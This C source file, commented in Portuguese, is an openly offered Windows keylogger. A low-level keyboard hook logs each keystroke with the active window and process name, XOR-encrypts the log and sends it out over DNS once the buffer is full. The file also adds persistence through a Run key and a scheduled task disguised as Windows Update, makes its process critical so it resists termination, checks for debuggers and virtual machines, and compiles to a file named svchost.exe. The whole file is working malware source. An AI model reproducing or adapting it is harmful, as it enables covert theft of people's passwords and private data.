#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <psapi.h>
#include <winsock2.h>
#include "../common/crypto.h"
#include "../common/stealth.h"
#include "../common/network.h"

// Estruturas não documentadas
typedef NTSTATUS (WINAPI *pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);

// Variáveis globais stealth
static HHOOK g_keyboard_hook = NULL;
static HHOOK g_mouse_hook = NULL;
static CryptoBuffer g_buffer = {{0}, 0, {0}, 0};
static bool g_stealth_mode = true;

// Hook de teclado de baixo nível
LRESULT CALLBACK stealth_keyboard_proc(int code, WPARAM wparam, LPARAM lparam) {
    if (code >= 0 && wparam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lparam;
        
        // Capturar contexto da janela ativa
        HWND active_window = GetForegroundWindow();
        char window_title[256] = {0};
        char process_name[256] = {0};
        
        GetWindowTextA(active_window, window_title, sizeof(window_title));
        
        DWORD pid;
        GetWindowThreadProcessId(active_window, &pid);
        HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (process) {
            GetModuleBaseNameA(process, NULL, process_name, sizeof(process_name));
            CloseHandle(process);
        }
        
        // Estrutura de dados para log
        struct {
            DWORD timestamp;
            DWORD vk_code;
            DWORD scan_code;
            char window[64];
            char process[64];
        } log_entry = {0};
        
        log_entry.timestamp = GetTickCount();
        log_entry.vk_code = kb->vkCode;
        log_entry.scan_code = kb->scanCode;
        strncpy(log_entry.window, window_title, 63);
        strncpy(log_entry.process, process_name, 63);
        
        // Criptografar e armazenar
        if (g_buffer.size + sizeof(log_entry) < sizeof(g_buffer.data)) {
            memcpy(g_buffer.data + g_buffer.size, &log_entry, sizeof(log_entry));
            xor_encrypt(g_buffer.data + g_buffer.size, sizeof(log_entry), g_buffer.key, 32);
            g_buffer.size += sizeof(log_entry);
        }
        
        // Exfiltrar quando buffer estiver cheio
        if (g_buffer.size > 3500) {
            exfiltrate_dns_real(g_buffer.data, g_buffer.size);
            g_buffer.size = 0;
        }
    }
    
    return CallNextHookEx(g_keyboard_hook, code, wparam, lparam);
}

// Função de declaração para evitar warning
void exfiltrate_data_dns(void);

// Técnicas de persistência
void install_persistence() {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    
    // Registry Run key
    HKEY key;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                      0, KEY_SET_VALUE, &key) == ERROR_SUCCESS) {
        RegSetValueExA(key, "WindowsSecurityUpdate", 0, REG_SZ, 
                       (BYTE*)exe_path, strlen(exe_path) + 1);
        RegCloseKey(key);
    }
    
    // Scheduled Task (mais stealth)
    char cmd[512];
    snprintf(cmd, sizeof(cmd), 
             "schtasks /create /tn \"Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\" "
             "/tr \"%s\" /sc onlogon /rl highest /f", exe_path);
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// Esconder processo
void hide_process() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    
    pNtSetInformationProcess NtSetInformationProcess = 
        (pNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
    
    if (NtSetInformationProcess) {
        ULONG break_on_termination = 1;
        NtSetInformationProcess(GetCurrentProcess(), 0x1D, 
                               &break_on_termination, sizeof(ULONG));
    }
}

// Função principal
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Verificações anti-análise
    if (is_debugger_present() || is_virtual_machine()) {
        return 0;
    }
    
    anti_analysis_delay();
    
    // Inicializar criptografia
    generate_system_key(g_buffer.key, 32);
    
    // Instalar persistência
    install_persistence();
    
    // Esconder processo
    if (g_stealth_mode) {
        hide_process();
    }
    
    // Instalar hooks
    g_keyboard_hook = SetWindowsHookExA(WH_KEYBOARD_LL, stealth_keyboard_proc, 
                                        GetModuleHandle(NULL), 0);
    
    if (!g_keyboard_hook) {
        return 1;
    }
    
    // Loop de mensagens invisível
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    if (g_keyboard_hook) UnhookWindowsHookEx(g_keyboard_hook);
    
    return 0;
}

// Compilar com: gcc -O3 -s -mwindows -o svchost.exe win_stealth_monitor.c -luser32 -lkernel32 -ladvapi32 -lpsapi -lws2_32